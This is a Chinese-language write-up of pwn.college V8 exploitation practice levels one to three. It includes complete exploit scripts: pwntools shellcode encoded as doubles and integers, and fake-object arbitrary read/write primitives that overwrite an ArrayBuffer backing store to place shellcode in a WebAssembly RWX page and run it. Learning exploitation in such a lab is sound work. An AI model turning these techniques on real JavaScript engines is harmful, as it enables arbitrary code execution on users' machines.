# Practice-Pwncollege

https://pwn.college/quarterly-quiz/v8-exploitation 提供了一些练习，需要注册账号。每道题目都有start和practice选项，区别在于practice提供的环境可以用sudo。我刚开始没意识到这点，准备调试d8的时候提示permission denied。加个sudo就解决了

题目提供的环境自带pwndbg，不过要用`pwndbg`命令唤起，而不是`gdb`。环境的workspace和desktop是互通的，在workspace里改动的文件能在desktop里看到，反之亦然

## level1

整个patch文件都是bug，将double数组里的元素拷贝到mmap的一块rwx内存后执行。直接生成shellcode后转成double类型即可
```py
from pwn import *
import struct
context.arch='amd64'
shellcode=asm(shellcraft.execve('/challenge/catflag', 0, 0))
exp=[]
for i in range(0,len(shellcode),8):
    exp.append(struct.unpack('d', shellcode[i:i+8].ljust(8,b'\x00'))[0])
print(exp)
```
```js
let shellcode=[2.820972645905851e-134, 3.0758087950517603e+180, 2.2354425876138794e+40, 3.68572438550025e+180, 1.054512194375715e-68, 2.748715909248e-311];
shellcode.run();
```
注意shellcode要执行题目自带的`catflag`而不是sh

## level2

这回总算知道了什么是“像噩梦一样”

patch文件提供了三个函数，`GetAddressOf`,`ArbRead32`和`ArbWrite32`。`GetAddressOf`返回的是对象压缩后的指针（即相对于基地址的偏移）；`ArbRead32`和`ArbWrite32`的参数也是压缩后的指针

这题的设置很像教程Part 6里的内容，甚至更简单了一点，不需要自己制造“任意”地址读写的函数，题目已经准备好了。只需要用ArrayBuffer将压缩指针的任意地址写提升成全局任意地址写即可

……然后噩梦就开始了。我根据教程里的说法用`%DebugPrint`+while无限循环调试，捣鼓了好一会终于成功了。但是`%DebugPrint`只有开启`--allow-natives-syntax`才能用，而实战环境里是没有的，所以我得去掉这句。但是v8 pwn和平时搞的linux pwn不同，非常不稳定。只要我改动一点，比如删除某行或者添加某行代码，泄漏地址的偏移就不一样了。现在问题来了，我得用`%DebugPrint`才能知道wasm_instance的地址从而计算泄漏的偏移，但是实战环境不能用；我又没办法算没有`%DebugPrint`时的偏移。这不就卡死了？

后面想了个别的方法。用`%DebugPrint`可以得到wasm_instance的地址，而wasm_instance内含有一些特殊的字节。这些字节在脚本每次运行时都一样，无论有没有`%DebugPrint`。所以在pwndbg里对这些字节用`search -x`就能在无`%DebugPrint`的情况下找到wasm_instance的地址了

还有一点是js里的整数。`ArbRead32`一次只能读32 bit，所以想要泄漏wasm的RWX内存地址要读两次。假设上半部分叫upper，下半部分叫lower，那么完整地址是`(upper<<32)|lower`对吧（至少python里是的）？结果js里因为整数带符号，出来的结果乱七八糟。后面我尝试套了一层BigInt，把`|`换成`+`，行了。不确定这是不是最好的办法，总之能用
```js
function shift32(i) {
	return i << 32n;
}
WASM_PAGE_UPPER_OFFSET = 0x2c35c;
WASM_PAGE_LOWER_OFFSET = 0x2c358;
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
let upper=BigInt(ArbRead32(GetAddressOf(wasm_instance)+WASM_PAGE_UPPER_OFFSET));
let lower=BigInt(ArbRead32(GetAddressOf(wasm_instance)+WASM_PAGE_LOWER_OFFSET));
let leak = shift32(upper)+lower;
console.log(leak);
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(buf);
let buf_addr = GetAddressOf(buf);
let backing_store_addr = buf_addr + 0x24;
ArbWrite32(backing_store_addr,Number(lower));
ArbWrite32(backing_store_addr+4,Number(upper));
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
```
shellcode的生成如下：
```py
from pwn import *
import struct
context.arch='amd64'
def bytes_to_int32_array(data, byte_order='little'):
    if len(data) % 4 != 0:
        raise ValueError("字节长度必须是4的倍数")
    format_char = 'I'
    if byte_order == 'little':
        fmt = f'<{len(data)//4}{format_char}'
    else:
        fmt = f'>{len(data)//4}{format_char}'
    return list(struct.unpack(fmt, data))
data = asm(shellcraft.execve('/challenge/catflag', 0, 0))
if len(data)%4!=0:
    data+=b'\x00'*(4-len(data)%4)
integers = bytes_to_int32_array(data, byte_order='little')
print(integers)
```
## level3

开始上难度了。这题提供的`GetAddressOf`与上一题相同，另外一个功能是`GetFakeObject`，用于在指定地址（tageed compressed pointer）创建一个heapObject并返回。没啥头绪，但是找到了一篇比较像的wp： https://faraz.faith/2019-12-13-starctf-oob-v8-indepth 。那道题的漏洞是数组越界写（和教程Part 6差不多），也是通过构造fake object来实现任意地址读写然后写shellcode

教程Part 5提到“v8里几乎所有东西都是HeapObject”。这意味着数组也不例外。数组内部的结构参考教程Part 6里的“图” `begin victim`那部分。可以发现就四个内容：`map ptr`，`properties ptr`,`backing store ptr`和`length of array `（各个字段的顺序不同版本不一样，但总归就这四个东西）。这里我又参考了上面那篇wp，发现数组读写只关乎于`map ptr`和`backing store ptr`(即数组元素)。于是可以利用`GetFakeObject`伪造具有任意`backing store ptr`的“数组”，实现相对于基地址的任意地址读写，后续就和上一题一样了

最开始想着完全自己伪造一个数组。但是`map ptr`指向的内容太复杂，不可能。遂参考wp，沿用一个已知数组的`map ptr`即可。map的类型决定数组该如何进行数据读写，因此这里用float（double）数组的map，可以进行64位的读写。而且虽然说只有两个字段重要，我在脚本里也把其他字段按照正常数组的结构补上了。可能没啥用，但至少程序崩溃时我可以少看一个地方

还有一点是，wp“年代久远”，当时v8还没有指针压缩机制。因此用来构造fake object的`arb_rw_arr`中有四个元素。现在只需要两个就好了。同理，拿`map ptr`时也从同样有两个元素的float数组拿。这里我也不确定是不是必须的，但伪造的内容多点总没有坏处
```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
function shift32(i) {
	return i << 32n;
}
RWX_PAGE_OFFSET=0x2c0fc;
ELEMENTS_OFFSET=-0x10
var float_arr = [1.1, 1.2];
var float_arr_map = GetAddressOf(float_arr)+0x187fbd;
var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_arr_map)), 1.2];
function arb_read(addr) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8));
    let fake = GetFakeObject(GetAddressOf(arb_rw_arr)+ELEMENTS_OFFSET);
    return ftoi(fake[0]);
}
function arb_write(addr, val) {
    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8));
    let fake = GetFakeObject(GetAddressOf(arb_rw_arr)+ELEMENTS_OFFSET);
    fake[0] = itof(BigInt(val));
}
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(GetAddressOf(wasm_instance)+RWX_PAGE_OFFSET+1);
console.log(rwx_page_addr);
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(shellcode_buf);
let buf_addr = GetAddressOf(shellcode_buf);
let backing_store_addr = buf_addr + 0x25;
arb_write(backing_store_addr,rwx_page_addr);
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
while(1){}
```
`GetAddressOf(arb_rw_arr)`获取`arb_rw_arr`的地址后找到其元素的起始地址作为fake object的地址。`addr-8`是因为数组并不直接从`backing store ptr`起始处进行读写，而是`backing store ptr`+8。这点可以通过DebugPrint一个正常的数组并查看其`backing store ptr`与元素实际存储的位置确定

以及我的脚本写得很乱，难以区分参数到底是tagged pointer还是普通pointer。这题不复杂所以我没晕，但感觉再不改掉这个习惯就要晕了

最后是不得不品的调试环节。它竟然能这么不稳定。上一题发现增减语句会导致偏移不对，没想到怎么唤起的d8也能影响偏移。我的exp首先在pwndbg里打印出了flag，但运行run时不行。最后在脚本末尾加了句`while(1){}`，然后用pwndbg attach找的偏移

还好这题会变的偏移其实只有两个，float_arr_map的偏移和rwx_page_addr的偏移。我一直习惯一步完成后再写下一步，但放到v8里会非常痛苦。第一步成功后去写第二步，写完后第一步废了；改完后去写第三步，写完后第一步第二步全废了……不断循环。这题exp的逻辑很清晰，所以更好的做法应该是先一次写完exp，标记会变的偏移后再用一次调试确定全部的偏移。但这个做法后续题目复杂了就不好用了吧，至少我是绝对没有一次完成exp全部步骤的能力的